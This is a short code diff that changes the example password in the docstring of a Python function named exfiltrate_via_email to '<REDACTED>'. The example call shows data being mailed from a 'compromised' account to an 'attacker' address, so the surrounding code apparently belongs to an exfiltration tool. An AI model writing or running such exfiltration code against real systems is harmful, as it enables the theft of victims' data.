@@ -487,7 +487,7 @@ def exfiltrate_via_email(
         ...     smtp_port=587,
         ...     from_email="compromised@gmail.com",
         ...     to_email="attacker@gmail.com",
-        ...     password="app_password"
+        ...     password="<REDACTED>"
         ... )
     """
     results = {
